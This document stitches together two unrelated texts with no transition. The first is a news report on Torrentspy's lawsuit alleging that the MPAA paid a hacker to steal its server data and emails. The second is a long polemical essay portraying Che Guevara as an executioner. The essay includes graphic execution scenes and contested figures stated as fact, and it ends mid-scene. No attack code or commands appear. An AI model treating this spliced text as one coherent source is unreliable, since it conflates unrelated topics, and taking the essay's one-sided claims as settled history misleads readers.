Torrentspy has just filed a lawsuit against the MPAA , accusing the group of conspiracy , unlawful business practices , misappropriation of trade secrets , violations of the California Invasion of Privacy Act , and more .
Torrentspy alleges ( PDF ) that the MPAA hired a hacker to retrieve private information from Torrentspy servers and from the private e-mail accounts of the company 's management .
The complaint alleges that a man named Dean Garfield offered a hacker US $ 15,000 to retrieve the information for the MPAA , telling the hacker that " we do n't care how you get it " ( p. 5 ) .
After accepting the assignment , the hacker allegedly broke into Torrentspy servers and retrieved the following items :
a. A Microsoft Excel spreadsheet containing Torrentspy.com income and expenses from January through June 2005 ; b. Private emails of Torrentspy.com / Valence Media principals and employees , including ( without limitation ) a Valence Media principal 's residential utility bill , showing his home address ; insertion orders for client advertising orders on the Torrentspy.com website ; and other personal , private and confidential information belonging to Plaintiffs ; c. Graphic file pictures , or " screenshots , " of Torrentspy.com computer servers , revealing information about Torrentspy.com servers and operations , including ( without limitation ) Internet Protocol ( " IP " ) addresses , names , file architecture , indexing of torrent files , and other confidential Torrentspy.com business information and trade secrets ; d. A file containing a list of Torrentspy.com servers and confidential information related to such servers ; e. Torrentspy.com client bills , billing information and other Torrentspy.com business information and trade secrets .
The complaint says that the information was then turned over to the MPAA in July of 2005 , at which time the organization transferred US $ 15,000 into the hacker 's bank account .
The hacker was told that his information had " been extremely useful . "
Now comes what is perhaps the most bizarre allegation in the lawsuit : the MPAA " planned to hire private investigators to comb through the trash of Plaintiff Justin Bunnell and other individuals associated with Valence Media and Torrentspy.com " ( p. 7 ) .
The hacker helped the group find a private investigator willing to do such a thankless job , and the suit alleges that Torrentspy 's trash was in fact examined .
Unfortunately , there 's no information on what this dumpster diving may have turned up .
This brings us to the question of how Torrentspy knows all of this information .
The lawsuit claims that the hacker was a former business associate of Justin Bunnell .
Though he agreed to do the hacking , he eventually had a change of heart ( after receiving the money , apparently ) and went to Torrentspy 's management and confessed what he had been up to .
The man 's testimony forms the basis of the lawsuit , but it 's worth pointing out that the MPAA has denied the allegations .
This is n't the first time that the MPAA has found its actions under scrutiny .
The group was accused earlier this year of making copies of a critical documentary without permission , and it has also had a habit of filing lawsuits first and asking questions later .
They 've also not been above a bit of well - placed hyperbole , arguing that counterfeit DVDs are " the new drug on the street . "
Still , the group shows no sign of backing down from its aggressive anti-piracy tactics , and it has recently added some new ones to its arsenal .
One of its recent initiatives is a UK partnership that trains dogs to sniff out DVDs .
" Lucky " and " Flo " have been hard at work at Stansted Airport in London , trying to sniff out batches of counterfeit DVDs in packages .
No word yet on when the dogs will be ready to sniff your computer for those telltale whiffs of copyrighted material .
Ernesto “ Che ” Guevara de la Serna was born on June 14 , 1928 , in Rosario , Argentina .
After studying medicine at the University of Buenos Aires , Guevara embarked on a life of political activism — first in his native Argentina and afterward in neighboring Bolivia and Guatemala .
In 1954 , while in Mexico , he met the Cuban revolutionaries Fidel Castro and his brother Raul .
Guevara joined Fidel Castro ’s quest to overthrow the government of Fulgencio Batista in Cuba .
He served as a military advisor to Castro and led guerrilla troops in combat against Batista forces .
When Castro officially took power in 1959 , Guevara was placed in charge of La Cabaña Fortress prison .
Che Guevara : Leftwing Monster
In August of 1960 , a year and a half after Che Guevara entered Havana ahead of his “ column ” of “ guerrillas , ” Time magazine featured the revolutionary comandante on its cover and crowned him the “ Brains of the Cuban Revolution . ”
( Fidel Castro was “ the heart ” and Raul Castro “ the fist . ” )
“ Wearing a smile of melancholy sweetness that many women find devastating , ” read the Time article , “ Che guides Cuba with icy calculation , vast competence , high intelligence and a perceptive sense of humor . ”
“ This is not a Communist Revolution in any sense of the term , ” The New York Times had declared a year earlier .
“ Fidel Castro is not only not a Communist , he is decidedly anti-Communist . ”
“ It would be a great mistake , ” Walter Lippmann wrote in the Washington Post that same month , “ even to intimate that Castro ’s Cuba has any real prospect of becoming a Soviet satellite . ”
A few months earlier the London Observer had observed : “ Mr. Castro ’s bearded youthful figure has become a symbol of Latin America ’s rejection of brutality and lying .
Every sign is that he will reject personal rule and violence . ”
Time magazine was in perfect sync with her major - media peers — utterly wrong .
Guevara was no more the brains of the Cuban Revolution than Cheka - head Felix Drezhinsky had been the brains of the Bolshevik Revolution , or Gestapo chief Himmler the brains of the National Socialist Revolution , or KGB head Beria the brains behind Stalinism .
In fact Che performed the same role for Fidel Castro as Drezhinsky performed for Lenin , Himmler for Hitler and Beria for Stalin .
Che Guevara was the Castro regime ’s chief executioner .
Under Che , Havana ’s La Cabana fortress was converted into Cuba ’s Lubianka .
He was a true Chekist : “ Always interrogate your prisoners at night , ” Che commanded his prosecutorial goons , “ a man is easier to cow at night , his mental resistance is always lower . ”
A Cuban prosecutor of the time who quickly defected in horror and disgust named Jose Vilasuso estimates that Che signed 400 death warrants the first few months of his command in La Cabana .
A Basque priest named Iaki de Aspiazu , who was often on hand to perform confessions and last rites , says
Che personally ordered 700 executions by firing squad during the period .
Cuban journalist Luis Ortega , who knew Che as early as 1954 , writes in his book Yo Soy El Che ! that Guevara sent 1,897 men to the firing squad .
In his book Che Guevara : A Biography , Daniel James writes that Che himself admitted to ordering “ several thousand ” executions during the first year of the Castro regime .
Felix Rodriguez , the Cuban - American CIA operative who helped track him down in Bolivia and was the last person to question him , says that Che during his final talk , admitted to “ a couple thousand ” executions .
But he shrugged them off as all being of “ imperialist spies and CIA agents . ”
Vengeance , much less justice , had little to do with the Castro / Che directed bloodbath in the first months of 1959 .
Che ’s murderous agenda in La Cabana fortress in 1959 was exactly Stalin ’s murderous agenda in the Katyn Forest in 1940 .
Like Stalin ’s massacre of the Polish officer corps , like Stalin ’s Great Terror against his own officer corps a few years earlier , Che ’s firing squad marathons were a perfectly rational and cold blooded exercise that served their purpose ideally .
His bloodbath decapitated literally and figuratively the first ranks of Cuba ’s anti-Castro rebels .
Five years earlier , while still a Communist hobo in Guatemala , Che had seen the Guatemalan officer corps with CIA assistance rise against the Red regime of Jacobo Arbenz and send him and his Communist minions hightailing into exile .
( For those leftists who still think that Arbenz was an innocent “ nationalist ” victimized by the fiendish United Fruit Company and their CIA proxies , please note : Arbenz sought exile not in France or Spain or even Mexico — the traditional havens for deposed Latin - American politicians — but in the Soviet satellite , Czechoslovakia .
Also , the coup went into motion , not when Arbenz started nationalizing United Fruit property , but when a cargo of Soviet - bloc weapons arrived in Guatemala .
“ Arbenz did n’t execute enough people , ” was how Guevara explained the Guatemalan coup ’s success . )
Fidel and Che did n’t want a repeat of the Guatemalan coup in Cuba .
Equally important , the massacres cowed and terrorized .
Most of them came after public trials .
And the executions , right down to the final shattering of the skull with the coup de grace from a massive .45 slug fired at five paces , were public too .
Guevara made it a policy for his men to parade the families and friends of the executed before the blood , bone and brain spattered firing squad .
Had Ernesto Guevara De La Serna y Lynch not linked up with Raul and Fidel Castro in Mexico city that fateful summer of 1955 — had he not linked up with a Cuban exile named Nico Lopez in Guatemala the year before who later introduced him to Raul and Fidel Castro in Mexico city — everything points to Ernesto continuing his life of a traveling hobo , mooching off women , staying in flophouses and scribbling unreadable poetry .
Che was a Revolutionary Ringo Starr .
By pure chance , he fell in with the right bunch at just the right time and rode their coattails to fame .
His very name “ Che ” was imparted by the Cubans who hob - knobbed with him in Mexico .
Argentines use the term “ Che ” much like Cubans use “ Chico ” or Michael Moore fans use “ dude . ”
The Cubans noticed Guevara using it so they pasted it to him .
And it stuck .
Fidel had brought the recently monikered “ Che ” on the Granma invasion of Cuba as the rebel group ’s doctor , based on his bogus credentials .
On the harrowing boat ride through turbulent seas from the Yucatan to Cuba ’s Oriente province in the decrepit old yacht , a rebel found Che lying comatose in the boat ’s cabin .
He rushed to the commander , “ Fidel , looks like Che ’s dead ! ”
“ Well , if he ’s dead , ” replied Castro .
“ Then throw him overboard . ”
In fact Guevara was suffering the combined effects of seasickness and an asthma attack .
Evidently , Che was not regarded as an invaluable member of the expedition at the time .
But today his famous photo by Alberto Korda ranks as the most reproduced print in the world .
Last year Burlington Industries introduced a line of infant wear bearing his famous image .
Even the Pope , on his visit to Cuba in 1998 , spoke approvingly about Che ’s “ ideals . ”
Che owes all this hype and flummery to the century ’s top media swindler , Fidel Castro , who also dispatched the hero deliberately to his death .
As those who know say , “ Fidel only praises the dead . ”
*****
As for the rest of Time ‘s assertions , other than his competence at murdering bound , gagged and blindfolded men , Che Guevara failed spectacularly at everything he attempted in his life .
First he failed as an Argentine medical student .
Though he ’s widely described as a medical doctor by his hagiographers ( Castaneda , Anderson , Taibo , Kalfon ) no record exists of Guevara ’s medical degree .
When Cuban - American researcher Enrique Ros inquired of the Rector of the University of Buenos Aires and the head of its Office of Academic Affairs for copies or proof of said document , Ros was variously told that the records had been misplaced or perhaps stolen .
In 1960 Castro appointed Che as Cuba ’s “ Minister of Economics . ”
Within months the Cuban peso , a currency historically equal to the U.S. dollar and fully backed by Cuba ’s gold reserves , was practically worthless .
The following year Castro appointed Che as Cuba ’s “ Minister of Industries . ”
Within a year a nation that previously had higher per capita income than Austria and Japan , a huge influx of immigrants and the 3rd highest protein consumption in the hemisphere was rationing food , closing factories , and hemorrhaging hundreds of thousands of its most productive citizens from every sector of its society , all who were grateful to leave with only the clothes on their back .
Most observers attribute this to “ Communist mismanagement . ”
Che himself confessed to his multiple economic errors and failings .
Actually , given the goal of Cuba ’s ruler since January of 1959 — i.e. , absolute power — the Cuban economy has been expertly managed .
Castro inherited a vibrant free market economy in 1959 ( something unique among communist rulers ) .
All the others — from Lenin to Mao to Ho to Ulbricht to Tito to Kim Il Sung –took over primitive and / or chaotic , war - ravaged economies .
A less megalomaniacal ruler would have considered that a golden goose had landed in his lap .
But Castro wrung its neck .
He deliberately and methodically wrecked Latin America ’s premier economy .
A Cuban capitalist is a person that could n’t be controlled , Castro reasoned then , and continues to do so to this day .
Despite a flood of tourism and foreign investment for over a decade , Cuba in 2005 is as essentially as poor ( and Communist ) as it was in 1965 or worse .
The Castro brothers are vigilant in these matters .
Che actually believed in the socialist fantasy .
When he pronounced in May of 1961 that under his tutelage the Cuban economy would boast an annual growth rate of 10 % he seemed to believe it .
Castro did n’t care .
He simply knew as a result he’d be running Cuba like his personal plantation , with the Cuban people as his cattle .
This is where libertarian / free - market ideologues get it wrong .
They insist that with the lifting of the embargo , capitalism will sneak in and eventually blindside Castro .
All the proof is to the contrary .
Capitalism did n’t sweep Castro away or even co-opt him .
He blindsided it .
He swept it away .
He is not Deng or Gorbachev .
In 1959 Castro could have easily left most of Cuba ’s economy in place , made it obedient to his whims , and been a Peron , a Franco , a Mussolini – the idol of his youth .
He could have grabbed half and been a Tito .
He could have demanded a piece of the action from all involved and been a Marcos , a Trujillo , a Mobutu , a Suharto .
But this was n’t enough for him .
Castro lusted for the power of a Stalin or a Mao .
And he got it .

Che Guevara ’s most famous book is titled Guerrilla Warfare .
His famous photo is captioned “ Heroic Guerrilla . ”
On the other hand his most resounding failure came precisely as a guerrilla , while there is no record of him prevailing in any bona - fide guerrilla battle .
In fact , there are precious few accounts that he actually fought in anything properly described as a battle .
The one that describes his most famous military exploit is referred to as “ The Battle of Santa Clara , ” which took place in December 1958 .
The loss of this “ battle ” by the Batista forces is alleged to have caused Batista to lose hope and flee Cuba .
To commemorate this historic military engagement , Castro has built a Che Guevara museum in Santa Clara .
“ One Thousand Killed in 5 days of Fierce Street Fighting , ” proclaimed a New York Times headline on Jan 4 , 1959 about the battle .
“ Commander Che Guevara appealed to Batista troops for a truce to clear the streets of casualties ” the articles continued .
“ Guevara turned the tide in this bloody battle and whipped a Batista force of 3,000 men . ”
“ Those of us who were there can only laugh at this stuff , ” say participants on both sides who live in exile today .
In fact , the Battle of Santa Clara — despite what those early versions of Jayson Blair reported — was a puerile skirmish .
Che Guevara ’s own diary mentions that his column suffered exactly one casualty ( a soldier known as El Vaquerito ) in this ferocious “ battle . ”
Other accounts put the grand total of rebel losses as from three to five men .
Most of Batista ’s soldiers saw no reason to fight for a crooked , unpopular regime that was clearly doomed .
So they did n’t fire a shot , even those on the famous “ armored train , ” that Guevara supposedly attacked and captured .
Today that armored train is a major tourist attraction in Santa Clara .
The train , loaded with 373 soldiers and $ 4 M worth of munitions , was sent from Havana to Santa Clara in late December of 1958 by Batista ’s high command as a last ditch attempt to halt the rebels .
Che ’s rebels in Santa Clara bulldozed the tracks and the train derailed just outside of town .
Then a few rebels shot at it and a few soldiers fired back .
No one was hurt .
Soon some rebels approached brandishing a truce flag and one of the train ’s officers , Enrique Gomez , walked out to meet them .
Gomez was brought to meet Comandante Guevara .
“ What ’s going on here ! ’
Che shouted .
“ This is n’t what we agreed on ! ”
Gomez was puzzled .
“ What agreement ? ” he asked .
It turned out , unbeknownst to the troops inside , Guevara had used funds the revolutionaries had raised from anti-Batista Cubans to buy the train and all its armaments from its corrupt commander Colonel Florentino Rossell , who had already fled to Miami .
The price was either $ 350,000 or $ 1,000,000 , depending on the source .
Actually Che had every reason to be upset .
Actual shots fired against his troops ?
Here ’s another eye - witness account regarding Che ’s famous “ invasion ” of las Villas Province shortly before the famous “ battle ” of Santa Clara .
“ Guevara ’s column shuffled right into the U.S. agricultural experimental station in Camaguey .
Guevara asked manager Joe McGuire to have a man take a package to Batista ’s military commander in the city .
The package contained $ 100,000 with a note .
Guevara ’s men moved through the province almost within sight of uninterested Batista troops . ”
Francisco Rodriguez Tamayo was a Rebel captain who had been in on many of these transactions but he defected mere months after the Rebel victory .
In an El Diario de Nueva York article dated June 25th 1959 he claimed that Castro still had $ 4,500,000 left in that “ fund ” at the time of the Revolutionary victory .
“ I do n’t know what might have happened to that money . ” Rodriguez Tamayo adds .
Yet immediately after the Santa Clara bribe and skirmish , Che ordered 27 Batista soldiers executed as “ war criminals . ”
Dr. Serafin Ruiz was a Castro operative in Santa Clara at the time , but apparently an essentially decent one .
“ But Comandante ” he responded to Che ’s order .
“ Our revolution promises not to execute without trials , without proof .
How can we just ….? ”
“ Look Serafin ” Che snorted back .
“ If your bourgeois prejudices wo n’t allow you to carry out my orders , fine .
Go ahead and try them tomorrow morning — but execute them NOW ! ”
It was a Marxist version of the Red Queen ’s famous line to Alice in Wonderland : “ Sentence first — verdict afterwards ! ”
Che Guevara ’s own diary puts the grand total of his forces ’ losses during the entire two - year long “ civil war ” in Cuba at 20 , about equal to the average number dead during Rio de Janeiro ’s carnival every year .
To put it briefly , Batista ’s army barely fought .
Officials in Cuba ’s U.S. embassy at the time became a little skeptical about all the battlefield bloodshed and heroics reported in the New York Times and investigated .
They ran down every reliable lead and eyewitness account of what the New York Times kept reporting as bloody civil war with thousands dead in single battles .
They found that in the entire Cuban countryside , in those two years of “ ferocious ” battles between rebel forces and Batista troops , the total casualties on both sides actually amounted to 182 .
New Orleans has an annual murder rate double that .
Typically , Che Guevara does n’t even merit credit for the perfectly sensible scheme of bribing rather than fighting Batista ’s army .
The funds for these bribes derived mostly from Fidel ’s snookering of Batista ’s wealthy political opponents , convincing them that he was a “ patriotic Cuban , a democrat , ” and that they should join , or at least help fund , his 26th of July Movement in order to bring democracy and prosperity to Cuba .
In late 1957 Castro signed an agreement called “ The Miami Pact ” with several anti-Batista Cuban politicians and ex-ministers in exile at the time .
Most of these were quite wealthy .
Indeed if the term , “ rich , white Miami Cuban exiles , ” that liberals scornfully use against current Cuban - Americans ever fit — it was for the mulatto Batista ’s liberal opponents , for Fidel Castro ’s early backers .
Among these was former president Carlos Prio who Batista had ousted in his ( bloodless ) coup in 1952 , along with many of Prio ’s ministers and business cronies .
In fact , Guevara went ballistic over the Miami Pact , when he first learned of it , over this shameful deal with “ bourgeois ” elements .
“ I refuse to lend my historic name to that crime ! ” he wrote .
“ We rebels have proffered our asses in the most despicable act of buggery that Cuban history is likely to recall ! ”
It was despicable buggery for sure .
But Che had the buggerers and the buggerees reversed .
Lenin coined the term “ Useful Idiots , ” but to this day Castro remains history ’s virtuoso at snaring and employing them .
That a “ guerrilla war ” with “ peasant and worker backing ” overthrew Batista is among the century ’s most widespread and persistent academic fables .
No Cuban Castroites who participated actually believe this .
The Associated Press dispatches about Castro and Che ’s “ war ” were actually concocted and written by Castro ’s own agent in New York , Mario Llerena , who admits as much in his book , The Unsuspected Revolution .
Llerena was also the contact with Castro ’s most famous publicity agent , the New York Times , Herbert Matthews .
National Review ‘s famous 1960 cartoon showing a beaming Castro , “ I got my job through the New York Times ! ” nailed it .
To give them credit , most of Castro ’s comandantes knew their Batista war had been an elaborate ruse and gaudy clown show .
After the glorious victory , they were content to run down and execute the few Batista men motivated enough to shoot back ( most of these were of humble background ) , settle into the mansions stolen from Batistianos , and enjoy the rest of their booty .
British historian Hugh Thomas , though a leftist Labour Party member who sympathized with Castro ’s revolution , studied mountains of records and simply could not evade the truth .
His massive and authoritative historical volume Cuba sums it up very succinctly : “ In all essentials Castro ’s battle for Cuba was a public relations campaign , fought in New York and Washington . ”
Che Guevara , himself , possessed an immense capacity for self - deception .
On a state visit to Czechoslovakia in 1960 his Cuban companions pointed out the numerous prostitutes on the streets and in the very hotel where they stayed .
Che nodded wearily .
Back in Cuba when one of them winked and brought up the prostitutes
Che flared indignantly .
“ I did n’t see any prostitutes there ! ”
The Cubans looked at each other shrugging but knew better than to press the issue .
Che did n’t want to remember the sight of prostitutes .
He wanted to convince himself that such a thing was impossible in a glorious Socialist nation , a sister republic .
That gift for self - deception probably led him to believe the guerrilla war fable .
And while trying to duplicate it in Bolivia he paid for his obtuseness and wishful thinking with his life .
In Cuba , Che could n’t find anyone to fight against him .
In the Congo , scene of another of his guerrilla forays , he could n’t find anyone to fight with him .
In Bolivia he finally started getting a tiny taste of both .
In short order he was betrayed by the very peasants he set out to liberate ( but who did n’t see it quite that way ) , brought to ground and killed .
Shortly after entering Havana with the revolutionary forces , Che was already advising , equipping and dispatching guerrilla forces in an attempt to duplicate the Cuban Revolution in the Dominican Republic , Haiti , Panama , Nicaragua and Venezuela .
Every one of those guerrilla forces ( which were Cuban Communist - led and staffed ) was wiped out in short order , usually to the last man .
Rafael Trujillo and Luis Somoza were n’t about to follow Batista ’s example of pussyfooting against guerrillas .
A few years later Che equipped , advised and sent more guerrillas to Argentina and Guatemala .
Again they were stamped out almost to a man .
These guerrilla expeditions cost the lives of two of Che ’s fatally credulous friends : the Argentine Jorge Masseti and the Guatemalan Julio Caceres .
Leftist “ scholars ” complain about The Bay of Pigs invasion as “ Yankee intervention ” ( though every single invader , including the commanders was Cuban ) against an innocent nationalist revolution that wished only to be left alone .
They might revisit the documentary evidence .
In fact Castro and Che launched five of their own versions of the Bay of Pigs invasions before the U.S. had even started contingency planning for theirs .
Castro seemed to know these invasions to spark revolutions were futile .
But for Castro they still had a handy rationale .
“ These foreigners are nothing but troublemakers , ” he told a Cuban rebel named Lazaro Ascencio right after the revolutionary triumph .
“ Know what I ’m going to do with Che Guevara ?
I ’m going to send him to Santo Domingo and see if Trujillo kills him . ”
How serious was Castro ?
We can only guess .
But he found a way for Che to earn his keep and stay of trouble in Cuba by assigning him as commander of La Cabana , the fortress where political prisoners were held and killed .
Che ’s role in “ Imperialism ’s First Defeat ! ” as Castro refers to the Bay of Pigs invasion merits mention .
The American invasion plan included a ruse in which a CIA squad dispatched three rowboats off the coast of western Cuba in Pinar Del Rio ( 350 miles from the true invasion site ) loaded with time release Roman candles , bottle rockets , mirrors and a tape recording of battle .
The wily Guerrilla Che immediately deciphered the imperialist scheme .
That little feint 300 miles away at the Bay of Pigs was a transparent ruse , he determined .
The real invasion was coming in Pinar Del Rio .
Che stormed over to the site with several thousand troops , dug in , locked , loaded and waited for the “ Yankee / mercenary ” attack .
They braced themselves as the sparklers , smoke bombs and mirrors did their stuff offshore .
Three days later the ( literal ) smoke and mirror show expended itself and Che ’s men marched back to Havana .
Somehow
Che had managed to wound himself in the heated battle against the tape recorder .
The bullet pierced Che ’s chin and exited above his temple , just missing his brain .
The scar is visible in all post April ’ 61 pictures of Che ( the picture we see on posters and T shirts was taken a year earlier . )
Cuban novelist Guillermo Cabrera Infante , a Fidelista at the time , speculates the wound may have come from a botched suicide attempt .
Che hagiographers John Lee Anderson , Carlos Castaneda and Paco Taibo insist it was an accident , Che ’s own pistol going off just under his face .
Jorge Castaneda in his Companero : The Life and Death of Che Guevara cannot resist giving Che some credit for “ Imperialism ’s First Defeat . ”
The Mexican author ( and recent foreign minister ) writes that Che ’s role was “ crucial , ” explaining that Cuba ’s 200,000 man militia played a “ central role in the victory . ”
The training of these militia had been in the hands of Che since 1960 .
“ Without Che ” Castaneda gushes , “ the militias would not have been reliable . ”
Here ’s a summary of the Battle of the Bay of Pigs , and the militia ’s performance : 51,000 Castro troops and militia with limitless Soviet arms , including tanks and planes and batteries of heavy artillery met 1400 mostly civilian exile freedom - fighters , most with less than a month ’s training .
These men carried only light arms and one day ’s ammunition .
The Che - trained militia hit them , then immediately halted and fled hysterically .
They were ordered back , probed hesitantly again , got mauled again and retreated in headlong flight again .
They marched back again , many at gun-point , and rolled in battery after battery of Soviet 122 mm Howitzers .
They rained 2000 rounds of heavy artillery into lightly - armed men they outnumbered 50 - 1 .
( “ Rommel ’s crack Afrika Corps broke and ran under a similar bombardment , ” explains Bay of Pigs historian Haynes Johnson . )
Then Castro ’s unopposed air force strafed the invaders repeatedly and at will .
The invaders stood their ground to the last man and the militia was forced to probe yet again — and retreat again in headlong flight .
They eventually stopped and brought in reinforcements .
( 50 - 1 was not enough . )
They rained another Soviet artillery storm on the utterly abandoned and hopelessly outnumbered freedom fighters and finally moved in to overwhelm them — after three days of effort in which the invaders had n’t eaten , drank or slept , and had run out of ammunition .
Castro ’s forces took 5200 casualties in the process .
The freedom fighters suffered 114 .
Che did show up at the battle site , but the day the shooting ended .
He walked into a building strewn with captured and wounded freedom - fighters and looked around with his wry Argentine smile .
“ We ’re going to execute every one of you , ” he barked .
Then he turned on his heels and walked out .
As usual , Castro had a much shrewder plan for the prisoners .
His regime reaped a propaganda windfall and 62 million American dollars when JFK ransomed them back .
In fact , Castro was fuming at his Militia ’s performance .
A week after the battle he visited some of the freedom - fighters in their Havana prison cells .
One had been an old acquaintance from college .
“ Hombre , if I had 20,000 men like you guys , ” Castro beamed to his old friend . ” I ’d have all of Latin America in my hands right now ! ”

One of the longest and bloodiest guerrilla wars on this continent was fought not by Fidel and Che but against Fidel and Che — and by landless peasants .
Farm collectivization was no more voluntary in Cuba than in the Ukraine .
And Cuba ’s kulaks had guns , a few at first anyway , and put up a heroic resistance until the Kennedy - Khrushchev deal during the “ Cuban Missile Crisis ” finally starved them of supplies .
Cubans know this war as “ The Escambray Rebellion . ”
It ’s rarely reported , but Che Guevara had a very bloody hand in one of the major anti-insurgency wars on this continent .
Seventy to 80 percent of these rural anti-communist peasant guerrillas were executed on the spot on capture .
“ We fought with the fury of cornered beasts ” was how one of the few lucky ones who escaped alive described the guerrillas ’ desperate freedom - fight against the totalitarian agendas of the Cuban regime .
( In 1956 , when Che linked up with the Cuban exiles in Mexico city , one of them recalls Che railing against the Hungarian freedom - fighters as “ Fascists ! ” and cheering their extermination by Soviet tanks . )
In 1962 Che got a chance to do more than cheer from the sidelines .
“ Cuban militia units ( whose training and morale Jorge Castaneda insists we credit to Che ) commanded by Russian officers employed flame - throwers to burn the palm - thatched cottages in the Escambray countryside .
The peasant occupants were accused of feeding the counterrevolutionaries and bandits . ”
The Maoist line about how “ a guerrilla swims in the sea which is the people , etc. , ” fit Cuba ’s anti-Communist rebellion perfectly .
Raul Castro himself admitted that his government faced 179 bands of “ counter - revolutionaries ” and “ bandits . ” at the time .
So in a massive “ relocation ” campaign reminiscent of the one Spanish General Valerinao “ The Butcher ” Weyler carried out against Cubans during their war of independence at the turn of the century , Castro ’s Soviet - trained armed forces ripped hundreds of thousands of rural Cubans from their ancestral homes at gunpoint and herded them into concentration camps on the opposite side of Cuba .
According to evidence presented to the Organization of American States by Cuban - exile researcher Dr. Claudio Beneda , 4000 anti-Communist peasants were summarily executed during this rural rebellion .
Time magazine notwithstanding , Fidel Castro — and Fidel Castro alone — was the “ brains ” of the Cuban Revolution .
And part of his acumen was his proficiency at sizing up his revolutionary companeros , then delegating jobs — then eliminating them in various ways as circumstances dictated .
With Guevara he performed masterfully .
First he assigned him to be commander of Havana ’s La Cabana fortress , which Che promptly converted to a prison and killing field .
“ Crazy with fury I will stain my rifle red while slaughtering any enemy that falls in my hands !
My nostrils dilate while savoring the acrid odor of gunpowder and blood .
With the deaths of my enemies I prepare my being for the sacred fight and join the triumphant proletariat with a bestial howl ! ”
Che Guevara wrote these lines while in his early twenties , before he had gotten his hands on any such enemy .
The passage appears in Che ’s Motorcycle Diaries , recently made into a heartwarming film by Robert Redford — the only film to get a whooping standing ovation at the Sundance Film Festival .
It seems that Redford omitted this inconvenient portion of Che ’s diaries from his touching tribute .
Two weeks after Che entered Havana and took his post at La Cabana fortress , Castro saw his instincts as a personnel manager fully vindicated .
The “ acrid odor of gunpowder and blood ” never reached Guevara ’s nostrils from actual combat .
It always came from the close range murder of bound , gagged and blindfolded men .
“ We must create the pedagogy of the paredon ( firing squad . ) ”
Che instructed his Revolutionary Tribunals : “ We do n’t need proof to execute a man .
We only need proof that it ’s necessary to execute him .
A revolutionary must become a cold killing machine motivated by pure hate . ”
Actually , Che Guevara was anything but a “ cold killing machine . ”
The term implies a certain detachment or nonchalance towards murder .
In fact Che gave ample evidence of enjoying it .
Almost all Cubans who knew him and are now in exile and able to talk freely ( Jose Benitez , Mario Chanes de Armas Dariel Alarcon among others ) recall Che Guevara as a classic psychopath .
In January 1957 , shortly after landing in Cuba aboard the yacht Granma with Fidel and Raul Castro , Che sent a letter to his discarded wife , Hilda Gadea .
“ Dear vieja ( i.e , ‘ Ole Lady ’ — on top of everything else , Che was also a notorious misogynist )
I ’m here in Cuba ’s hills , alive and thirsting for blood . ”
His thirst would soon be slaked .
In that very month , January 1957 , Fidel Castro ordered the execution of a peasant guerrilla named Eutimio Guerra who he accused of being an informer for Batista ’s forces .
Castro assigned the killing to his own bodyguard , Universo Sanchez .
To everyone ’s surprise , Che Guevara — a lowly rebel soldier / medic at the time ( not yet a comandante — volunteered to accompany Sanchez and another soldier to the execution site .
The Cuban rebels were glum as they walked slowly down the trail in a torrential thunderstorm .
Finally the little group stopped in a clearing .
Sanchez was hesitant , looking around , perhaps looking for an excuse to postpone or call off the execution .
Dozens would follow , but this was the first execution of a Castro rebel by Castro ’s rebels .
Suddenly without warning
Che stepped up and fired his pistol into Guerra ’s temple .
“ He went into convulsions for a while and was finally still .
Now his belongings were mine . ”
Che wrote in his Diaries .
Shortly afterwards ,
Che ’s father in Buenos Aires received a letter from his prodigal son .
“ I ’d like to confess , papa ’ , at that moment I discovered that I really like killing . ”
This attitude caught Castro ’s eye .
More executions of assorted “ deserters ” informers ” and “ war criminals ” quickly followed , all with Che ’s enthusiastic participation .
One was of a captured Batista soldier , a 17 - year old boy totally green to the guerrilla “ war , ” hence his easy capture .
First Che interrogated him .
“ I have n’t killed anyone , comandante , ” the terrified boy answered Che .
“ I just got out here !
I ’m an only son , my mother ’s a widow and I joined the army for the salary , to send it to her every month … do n’t kill me ! ”
He blurted out when he heard Che ’s unmoved reply , “ Do n’t kill me ! — why ? ”
The boy was trussed up , shoved in front of a recently dug pit and murdered .
Fidel was privy to these events .
He thought executing Batista soldiers was incredibly stupid , compared to the propaganda value of releasing them since most were n’t fighting anyway .
But he recognized the value of executions in intimidating other Cubans , and recognized Che ’s value as someone who enjoyed the job .
By the summer of 1957 Che Guevara had been promoted to full - fledged Major or “ comandante , ” the Rebel army ’s highest rank .
His fame was spreading .
But not all the revolutionaries were favorably impressed .
In mid-1958 one of the rebels was wounded and made his way to a Dr. Hector Meruelo in the nearby town of Cienfuegos .
The good doctor patched him up and a few weeks later informed him that he was well enough to return to Che ’s column .
“ No , doctor , ” the boy responded .
Please be discreet with this because it could cost me my life , but I ’ve learned that Che is nothing but a murderer .
I ’m a revolutionary but I ’m also a Christian .
I ’ll go and join Camilo ’s column ( Camilo Cienfuegos ) — but never Che’s . ”
As commander of the La Cabana prison , Che often insisted on shattering the skull of the condemned man by firing the coup de grace himself .
When other duties tore him away from his beloved execution yard , he consoled himself with watching the executions .
Che ’s office in La Cabana had a section of wall torn out so he could watch his firing squads at work .
A Rumanian journalist named Stefan Bacie visited Cuba in early 1959 and was fortunate enough to get an audience with the already famous leader , whom he had also met briefly in Mexico city .
The meeting took place in Che ’s office in La Cabana .
Upon entering , the Rumanian saw Che motioning him over to his office ’s newly constructed window .
Stefan Bacie got there just in time to hear the command of fuego , hear the blast from the firing squad and see a condemned prisoner man crumple and convulse .
The stricken journalist immediately left and composed a poem , titled , “ I No Longer Sing of Che . ”
( “ I no longer sing of Che any more than I would of Stalin , ” go the first lines . )
A Cuban gentleman named Pierre San Martin was among those jailed by Che Guevara in the early months of the Cuban Revolution .
In an El Nuevo Herald article from December 28 , 1997 San Martin recalled the horrors : “ Thirteen of us were crammed into a cell .
Sixteen of us would stand while the other sixteen tried to sleep on the cold filthy floor .
We took shifts that way .
Dozens were led from the cells to the firing squad daily .
The volleys kept us awake .
We felt that any one of those minutes would be our last .
One morning the horrible sound of that rusty steel door swinging open startled us awake and Che ’s guards shoved a new prisoner into our cell .
He was a boy , maybe 14 years old .
His face was bruised and smeared with blood .
“ What did you do ? ” We asked horrified .
“ I tried to defend my papa , ” gasped the bloodied boy .
“ But they sent him to the firing squad . ”
Soon
Che ’s guards returned .
The rusty steel door opened and they yanked the boy out of the cell .
“ We all rushed to the cell ’s window that faced the execution pit , ” recalls Mr. San Martin .
“ We simply could n’t believe they ’d murder him .
“ Then we spotted him , strutting around the blood - drenched execution yard with his hands on his waist and barking orders — Che Guevara himself .
‘ Kneel down ! ’
Che barked at the boy .
“ Assassins ! ” we screamed from our window .
“ I said : KNEEL DOWN ! ”
Che barked again .
The boy stared Che resolutely in the face .
